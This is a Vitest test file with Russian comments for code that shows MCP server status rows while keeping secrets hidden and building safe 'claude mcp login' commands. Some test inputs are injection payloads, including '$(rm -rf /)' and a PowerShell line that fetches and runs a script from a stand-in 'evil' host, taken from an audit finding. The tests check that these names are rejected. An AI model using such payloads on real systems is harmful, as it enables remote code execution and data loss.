import { describe, expect, it } from 'vitest'
import {
  commandOf,
  foldMcpTokens,
  hostOf,
  markIndex,
  mcpLoginCommand,
  shellSafeName,
  mcpToolFullName,
  mcpRowFrom,
  sortMcpRows
} from '@shared/mcp'

/**
 * Стрижка ответа SDK перед показом человеку.
 *
 * Главное, что здесь проверяется: **секрет не должен пересечь IPC**. У серверов
 * ключи лежат в `env` (локальные) и `headers` (сетевые), а у самодельных ещё и
 * прямо в адресе. Проверка идёт не по «мы это не рисуем», а по составу
 * возвращённого объекта: чего в нём нет, то не утечёт ни в DevTools, ни в дамп.
 */
describe('секреты не покидают главный процесс', () => {
  it('env локального сервера не попадает в строку ни одним полем', () => {
    const row = mcpRowFrom({
      name: 'blender',
      status: 'connected',
      config: {
        type: 'stdio',
        command: 'C:\\tools\\uvx.exe',
        args: ['blender-mcp', '--token=SEKRET-ARG'],
        env: { API_KEY: 'SEKRET-ENV', OPENAI_API_KEY: 'sk-SEKRET' }
      }
    })
    const dump = JSON.stringify(row)
    expect(dump).not.toContain('SEKRET-ENV')
    expect(dump).not.toContain('sk-SEKRET')
    // Аргументы тоже не показываем: там встречается и токен, и путь к дому.
    expect(dump).not.toContain('SEKRET-ARG')
    expect(row.origin).toBe('uvx.exe')
    expect(row.transport).toBe('stdio')
  })

  it('headers сетевого сервера не попадают в строку', () => {
    const row = mcpRowFrom({
      name: 'corridor',
      status: 'connected',
      config: {
        type: 'http',
        url: 'https://api.example.com/mcp',
        headers: { Authorization: 'Bearer SEKRET-HEADER' }
      }
    })
    expect(JSON.stringify(row)).not.toContain('SEKRET-HEADER')
    expect(row.origin).toBe('api.example.com')
  })

  it('ключ внутри адреса остаётся за бортом — показываем только хост', () => {
    const row = mcpRowFrom({
      name: 'n8n',
      status: 'failed',
      error: 'MCP endpoint not found',
      config: { type: 'http', url: 'https://host.example.com/webhook/SEKRET-PATH?token=SEKRET-Q' }
    })
    const dump = JSON.stringify(row)
    expect(dump).not.toContain('SEKRET-PATH')
    expect(dump).not.toContain('SEKRET-Q')
    expect(row.origin).toBe('host.example.com')
    // Причина отказа — дословно от движка: наш пересказ человеку не поможет.
    expect(row.error).toBe('MCP endpoint not found')
  })

  it('хост и команда вытаскиваются устойчиво, а мусор не ломает разбор', () => {
    expect(hostOf('https://mcp.notion.com/mcp')).toBe('mcp.notion.com')
    expect(hostOf('не-адрес')).toBeUndefined()
    expect(commandOf('/usr/local/bin/npx')).toBe('npx')
    expect(commandOf('"C:\\Program Files\\node\\npx.cmd"')).toBe('npx.cmd')
    expect(commandOf('   ')).toBeUndefined()
  })
})

describe('состояние берётся у движка, а не додумывается', () => {
  it('известные состояния проходят как есть', () => {
    for (const s of ['connected', 'failed', 'needs-auth', 'pending', 'disabled'] as const) {
      expect(mcpRowFrom({ name: 'x', status: s }).status).toBe(s)
    }
  })

  it('незнакомое состояние не превращается в «работает»', () => {
    // Версия SDK может добавить своё слово. Обещать работоспособность мы не
    // вправе: «ждёт» — единственный честный ответ на неизвестное.
    expect(mcpRowFrom({ name: 'x', status: 'reconnecting' }).status).toBe('pending')
    expect(mcpRowFrom({ name: 'x', status: undefined }).status).toBe('pending')
  })

  it('пустые поля не превращаются в пустые строки на экране', () => {
    const row = mcpRowFrom({ name: 'x', status: 'connected', error: '   ', scope: '' })
    expect(row.error).toBeUndefined()
    expect(row.scope).toBeUndefined()
  })

  it('инструменты считаются, а цена появляется только когда её дали', () => {
    const raw = { name: 'x', status: 'connected' as const, tools: [{}, {}, {}] }
    expect(mcpRowFrom(raw).tools).toBe(3)
    expect(mcpRowFrom(raw).tokens).toBeUndefined()
    expect(mcpRowFrom(raw, 900).tokens).toBe(900)
    // Ноль — это «не считали», а не «бесплатно»: показывать «0 токенов» там,
    // где цифры нет, значит соврать в пользу удобства.
    expect(mcpRowFrom(raw, 0).tokens).toBeUndefined()
  })
})

describe('цена контекста складывается по серверам', () => {
  it('инструменты одного сервера суммируются', () => {
    const folded = foldMcpTokens([
      { name: 'a', serverName: 'playwright', tokens: 400 },
      { name: 'b', serverName: 'playwright', tokens: 350 },
      { name: 'c', serverName: 'context7', tokens: 120 }
    ])
    expect(folded).toEqual({ playwright: 750, context7: 120 })
  })

  it('мусор в ответе не роняет подсчёт', () => {
    expect(foldMcpTokens(undefined)).toEqual({})
    expect(
      foldMcpTokens([
        { name: 'a', serverName: '', tokens: 10 },
        { name: 'b', serverName: 'ok', tokens: -5 },
        { name: 'c', serverName: 'ok', tokens: 'много' as unknown as number },
        { name: 'd', serverName: 'ok', tokens: 7 }
      ])
    ).toEqual({ ok: 7 })
  })
})

describe('команда для входа обязана работать при копировании', () => {
  it('простое имя остаётся без кавычек', () => {
    expect(mcpLoginCommand('context7')).toBe('claude mcp login context7')
    expect(mcpLoginCommand('plugin:cloudflare:cloudflare-builds')).toBe(
      'claude mcp login plugin:cloudflare:cloudflare-builds'
    )
  })

  it('имя с пробелом берётся в кавычки — иначе CLI прочитает два аргумента', () => {
    // Настоящий случай с машины владельца: сервер называется «claude.ai Notion».
    expect(mcpLoginCommand('claude.ai Notion')).toBe('claude mcp login "claude.ai Notion"')
  })

  /*
   * НАХОДКА АУДИТА 2026-08-04. Раньше «опасное» имя заворачивалось в кавычки с
   * экранированием по правилам sh — а копируют команду в PowerShell, где
   * обратный слэш не экранирует НИЧЕГО: `\"` там просто закрывает строку, и
   * хвост исполняется как отдельная команда. Имя сервера приходит из
   * `.mcp.json` ОТКРЫТОГО ПРОЕКТА, то есть это чужой текст — получалось
   * выполнение кода из чужого файла по кнопке, обещавшей «честный ручной путь».
   *
   * Экранирования, годного сразу для sh, PowerShell и cmd, не существует.
   * Поэтому команды для таких имён просто НЕТ, а интерфейс говорит об этом.
   */
  it('имя с метасимволами команды не даёт вовсе', () => {
    expect(mcpLoginCommand('a"b')).toBeNull()
    expect(mcpLoginCommand('$(rm -rf /)')).toBeNull()
    expect(mcpLoginCommand('back\\slash')).toBeNull()
    // Ровно тот случай из аудита: закрывающая кавычка, своя команда и `#`,
    // съедающий хвост, чтобы не осталось следа.
    expect(mcpLoginCommand('docs";iwr http://evil/a.ps1|iex;#')).toBeNull()
    expect(mcpLoginCommand('a`b')).toBeNull()
    expect(mcpLoginCommand('a;b')).toBeNull()
    expect(mcpLoginCommand('a|b')).toBeNull()
    expect(mcpLoginCommand('a\nb')).toBeNull()
  })

  it('пробелы по краям и слишком длинное имя тоже отвергаются', () => {
    expect(mcpLoginCommand(' docs')).toBeNull()
    expect(mcpLoginCommand('docs ')).toBeNull()
    expect(mcpLoginCommand('x'.repeat(121))).toBeNull()
  })

  it('shellSafeName пропускает обычные имена и режет остальные', () => {
    expect(shellSafeName('context7')).toBe(true)
    expect(shellSafeName('claude.ai Notion')).toBe(true)
    expect(shellSafeName('plugin:cloudflare:builds')).toBe(true)
    expect(shellSafeName('a&b')).toBe(false)
    expect(shellSafeName('')).toBe(false)
  })
})

describe('порядок строк — это очередь к человеку', () => {
  it('сломанное и ждущее входа идут первыми, выключенное — последним', () => {
    const rows = sortMcpRows([
      { name: 'zeta', status: 'connected' },
      { name: 'off', status: 'disabled' },
      { name: 'broken', status: 'failed' },
      { name: 'alpha', status: 'connected' },
      { name: 'login', status: 'needs-auth' }
    ])
    expect(rows.map((r) => r.name)).toEqual(['broken', 'login', 'alpha', 'zeta', 'off'])
  })

  it('внутри группы порядок стабильный, чтобы список не прыгал', () => {
    const twice = () =>
      sortMcpRows([
        { name: 'b', status: 'connected' },
        { name: 'a', status: 'connected' }
      ]).map((r) => r.name)
    expect(twice()).toEqual(['a', 'b'])
    expect(twice()).toEqual(twice())
  })
})

describe('пометки сервера — его слово, не наше', () => {
  it('полное имя собирается по правилу движка', () => {
    expect(mcpToolFullName('playwright', 'browser_click')).toBe('mcp__playwright__browser_click')
    // Пробелы и точки в имени сервера движок заменяет на подчёркивания.
    expect(mcpToolFullName('claude.ai Notion', 'search')).toBe('mcp__claude_ai_Notion__search')
    expect(mcpToolFullName('plugin:cloudflare:api', 'docs')).toBe(
      'mcp__plugin_cloudflare_api__docs'
    )
  })

  it('индекс собирает только настоящие пометки', () => {
    const idx = markIndex([
      {
        name: 'files',
        tools: [
          { name: 'rm', annotations: { destructive: true } },
          { name: 'ls', annotations: { readOnly: true } },
          // Сервер ничего не сказал — этого в индексе быть не должно: пустая
          // пометка выглядела бы как «сервер заявил, что безопасно».
          { name: 'stat', annotations: {} },
          { name: 'noann' }
        ]
      }
    ])
    expect(idx['mcp__files__rm']).toEqual({ destructive: true })
    expect(idx['mcp__files__ls']).toEqual({ readOnly: true })
    expect(idx['mcp__files__stat']).toBeUndefined()
    expect(idx['mcp__files__noann']).toBeUndefined()
  })

  it('мусор в ответе не роняет индекс', () => {
    expect(markIndex([])).toEqual({})
    expect(markIndex([{ name: 'x' }, { tools: [{ name: 'y', annotations: { destructive: true } }] }])).toEqual({})
  })

  it('ложные значения пометок не превращаются в истину', () => {
    const idx = markIndex([
      { name: 's', tools: [{ name: 't', annotations: { destructive: false, readOnly: false } }] }
    ])
    expect(idx['mcp__s__t']).toBeUndefined()
  })
})
